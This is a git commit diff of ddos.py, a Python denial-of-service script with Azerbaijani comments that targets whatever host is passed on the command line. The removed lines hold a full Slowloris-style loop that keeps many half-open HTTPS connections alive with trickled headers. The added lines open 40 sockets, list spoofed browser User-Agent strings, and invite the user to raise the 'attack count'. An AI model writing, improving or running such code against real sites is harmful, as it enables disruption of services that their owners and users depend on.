c5cd2b10aab8da8bee90d7c6fac7324a6597cf53
Nurlan Garash <68768916+nurlangarash@users.noreply.github.com>
2021-03-30 16:47:56 +0400

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,5 +1,3 @@
-import random
-import time
 import socket
 import sys
 printLog = 2
@@ -8,41 +6,28 @@ def log(text, lvl=1):
         print(text)
 socketList = []
 HTTPHeaders = [
-    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/41.0 Firefox/42.0",
-    "Accept-language: en-US,en,q=0.8"
+    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/41.0 Firefox/42.0", # asagida alternativler movcuddur ( 11-ci setir)
+    "Accept-language: *" # asagida alternativler movcuddur ( 15-ci setir) 
+    ############## User-agent ucun:
+    # Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
+    # Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0
+    # Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41
+    ############# Accept-language ucun:
+    # fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
+    # de
+    # de-CH
+    # en-US,en;q=0.5
 ]
 hostName = sys.argv[1]
-socketCount = 100
-log("{} saytina {} dene qosulma isteyi gonderilir.".format(hostName, socketCount))
-for _ in range(socketCount):
+attackCount = 40 # buradan hucum sayini artirin.
+log("{} saytina {} eded fake user gonderilir.".format(hostName, attackCount))
+for i in range(1,attackCount+1):
     try:
-        log("{} saytina qosulur. Artiq {} qosulma mumkun oldu".format(hostName, _), lvl=2)
+        log("Artiq {} qosulma mumkun oldu".format(i), lvl=2)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(4)
         s.connect((hostName, 443))
     except socket.error:
         break
     socketList.append(s)
-log("baglanti ayarlari qurasdirilir")
-for s in socketList:
-    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 20000)).encode("UTF-8"))
-    for header in HTTPHeaders:
-        s.send(bytes("{}\r\n".format(header).encode("UTF-8")))
-while True:
-    log("header-ler yenilenir")
-    for s in socketList:
-        try:
-            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("UTF-8"))
-        except socket.error:
-            socketList.remove(s)
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(4)
-                s.connect((hostName, 443))
-                for s in socketList:
-                    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 20000)).encode("UTF-8"))
-                    for header in HTTPHeaders:
-                        s.send(bytes("{}\r\n".format(header).encode("UTF-8")))
-            except socket.error:
-                continue
-    time.sleep(15)
+log("{} saytina ugurla {} eded fake user gonderildi.".format(hostName, i))
